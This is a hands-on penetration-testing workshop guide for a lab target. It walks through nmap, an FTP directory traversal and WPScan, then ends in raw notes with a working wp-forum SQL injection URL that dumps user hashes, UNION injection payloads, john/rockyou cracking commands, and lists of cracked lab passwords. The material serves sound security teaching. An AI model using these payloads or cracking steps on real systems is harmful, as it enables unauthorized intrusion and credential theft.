# Introduction

In this workshop you will be using open source tools to gain access to (i.e. hack) a remote host (i.e. computer). 

## Rules

1. Do not attack any hosts other than your assigned target. 
2. Do not attack the infrastructure.
3. Do not use the infrastructure for anything other than the prescribed activities. E.g., don't use workshop resources to browse social media, mine cryptocurrency, do your schoolwork, etc.  

We are completely OK with you breaking stuff as you learn, so don't be afraid to try things not explicitly covered by the facilitators. However, violating the above intentionally or in a manner which is disruptive to other participants is grounds for immediate removal from the workshop.

# Setup

You may complete this workshop using one of the provided laptops or your own. At a minimum, you will need a system with an SSH client and a remote desktop client. Depending on what type of system you're on, the following programs will meet these requirements.

OS | SSH | Remote Desktop
------------ | ------------ | -------------
Linux | ssh (built-in) | [rdesktop](http://www.rdesktop.org/)
Windows | [Bitvise SSH Client](https://www.bitvise.com/ssh-client) | Remote Desktop (built-in)
ChromeOS | Secure Shell | Chrome RDP
OSX | ssh (built-in) | [CoRD](http://cord.sourceforge.net/)

Each workstation should have assigned to it a set of 4 IP addresses.

- You (external): machine you will be SSHing into to access your offensive tools
- You (internal): don't worry about this for now
- Target (external): host you will be attacking
- Target (internal): don't worry about this for now

If you are using your own hardware, just ask one of the facilitators for a set of IPs to work with.

When you are ready, SSH into your workstation using either (1) the provided private key, or (2) the password: CorrectBatteryHorseStaple

For GUI based SSH clients, just fill in the appropriate blanks. For command line clients (CLI), the syntax will look something like:

```bash
# using private key
ssh -i haxdemo.pub [IP]

# using password
ssh [IP]
```

# Scan / Enumerate

First we need to figure out what is running on your target / what it even is. Is it someone's personal Macbook? A Linux based webserver in some server farm? A Windows server handling corporate email? A SCADA system controlling uranium enriching machines? Each of these will look very different and give rise to different attack vectors.

Nmap is a tool used for network discovery and scanning. In this case, we already know the address of our target so we will use the tool to see what is going on with the target from a network perspective. At its most basic, nmap lets us see what ports are open on the target system. 

```bash
nmap [IP] -A -p20-450,3389
```

Ok, we see that ports 21, 80, 135, 445, and 3389 are open. These ports are commonly associated with FTP, HTTP, SMB and RDP. On our target system there are one or more vulnerable services on each port. We will investigate each in turn.

# What's our goal?

Let's first see what ouy ultimate goal is. Remote desktop (RDP) is a service used by Windows based machines to provide GUI based interactivity over networks. The machine providing the connection typically listens on port 3389 for incoming connections, which is why we suspect (though don't know for sure yet) this machine provides the service. From your physical machine, try connecting to the machine via RDP. On Windows based hosts, type "remote desktop" into the search / run bar and fill in the blanks. For CLI, try something like:

```bash
rdesktop [target external IP]
```

You should see a familiar screen (if you've ever used a Windows machine). However, we are stopped at the gates because we don't have credentials for the box. At this point, we know there is something potentially interesting here but we don't know how interesting, or how to get that interesting stuff. For now, our goal is to answer these questions. We will do so by exploiting vulnerabilities in the services hosted by this box.

# Exploit - FTP

First let's consider the FTP service. The file transfer protocol (FTP) is an ancient protocol (i.e. manner of communication defined by ports, syntax, and behavior) that is used by computers to, you guessed it, transfer files. While it is very reliable, it provides only a modicum of security because it is from a different era, before cyber security was really a thing. Most problematically, it is a protocol that may be implemented by anyone which means that it will be as secure as the person implementing the software makes it. I.e., it's a exploitable service even when implemented perfectly but when done poorly, it is basically Swiss cheese.

The following is the part of the nmap output that pertains to the FTP service on our target box. 

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Acritum Femitter Server ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Nmap says that this particular FTP server is probably Acritum Femitter, an older piece of software that runs on Windows based hosts. Log in to the FTP server by typing `ftp [target ip]` and using whatever username you wish (since anonymous logins are allowed). Then try typing in `ls`. What do you see?

Doing a little bit of googling reveals that Femitter is vulnerable to a simple directory traversal exploit. Check out one of the reports on [ExploitDB](https://www.exploit-db.com/exploits/15445/). Now try typing in the following:

```bash
ls ../
ls ../../
ls ../../../
ls ../../../Users/
ls ../../../Users/Administrator
```

You now have read access to much if not all of the files on your target host!

**Question:** What traction does this simple exploit get us on this system?
**Question:** What limitations are there to this exploit?

#########################

# Exploit - HTTP

Next let's consider the HTTP(?) service being hosted on port 80. The hypertext transfer protocol (HTTP) is what powers websites. All the fancy websites that we see on the modern Internet still rely on the several decades old markup language that is HTTP to tell our browsers how they want to look. As with FTP, HTTP servers can have security gaps due to poor implementation. However, an even greater threat to servers hosting websites is that even if the server software is relatively secure, the websites they are serving may present huge vulnerabilities (as we will see shortly).

Let's see what's actually on our target's web server. The target's HTTP port is not exposed to the world for security reasons, so you'll need to view the website through your virtual (attacking) host. Open an RDP session to your attacking host (e.g. `rdesktop [your external IP]`) and point its browser to your target's internal IP address. You should see three folders; for now we will focus on "wp46".

Clicking on the "wp46" link takes us to what appears to be a Wordpress site. For those unfamiliar, Wordpress is a highly popular CMS (content management platform) that is notorious for vulnerabilities both through its core code, as well as its myriad 3rd party plugins. I.e., this is promising. Because it is basically a blogging platform, Wordpress must provide a way for users to publish their blogs (i.e. send content to the server). This is done via an admin interface, which in default installations of WP is accessible via http://[server address]/wp-admin. Try that now.

Looks like a standard install, at least in this sense, but we'll need creds. Based on the name of the folder, we might guess that this is a site built on Wordpress 4.6 but we can make sure (sort of)
by checking some of the default files included with any installation of Wordpress. Check out http://[server address]/INSTALL and http://[server address]/VERSION. Also, take a look at http://[server address]/wp-content/plugins.

We can use what we see here to check whether any off-the-shelf exploits are available for this particular setup. We can do this manually doing a whole lot of reading, or we can use a handy tool called WPScan. WPscan checks all the characteristics of a particular Wordpress install against a database of known vulnerabilities to see whether any potentially match.

Open an SSH session to your attacking host and type the following.

```bash
wpscan http://[target internal IP]/wp46 --enumerate ap
```

This points the tool at the WP site we see and tells the tool to check for all known plugin vulnerabilities. This may take a few minutes but at the end of it, you will get a whole lot of output. While some or even many of the hits that come up will work against this system, they will mostly not be super helpful or require very specific conditions to work. However, there is one vulnerability in this system that is flaring. Towards the bottom, you will see an entry for a plugin called "wp-forum". Take a look at the website the entry links to.




#########################

http://localhost/wp46/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat(user_login,0x3a,user_pass)+from+wp_users%23

covfefeinthemorning

#########################

USE TASK SCHEDULER!!!!
"C:\UniServerZ\UniController.exe" start_both
"C:\Program Files (x86)\Femitter\fem.exe"

#########################


john

printf "$P$BpSB2/Dfwq.m/ow80YFL4vALF5z4Yi." > wp46.hash

john -wordlist:/usr/share/wordlists/rockyou.txt wp46.hash

#########################

widgetco1

' or '1=1	// works
' UNION ALL SELECT 1, name, type, 1 FROM sqlite_master WHERE '1=1
' UNION ALL SELECT id, username, password, id FROM users WHERE '1=1

#########################

nano wc1.hash

$2y$10$4sg.NSViLBMPUrJWcMBp2eUoo9MGGbWQSo10SE5.bKQtq/IOTUwWe
$2y$10$CTFNGiYwgmM/CZyD7mmSeuXNgbl.lMiFKg1GWDd4id.wzDHbsX4TW
$2y$10$Bm.bTcsqOHDH/g.XgKGAR.kR.JmIopyv8DCZPLxqDraduSn4mZ2M2

john -wordlist:/usr/share/wordlists/rockyou.txt wc1.hash	

saltyformercw3
overworkedunderpaid
Eggshell+Romalian
beerbeerbeer
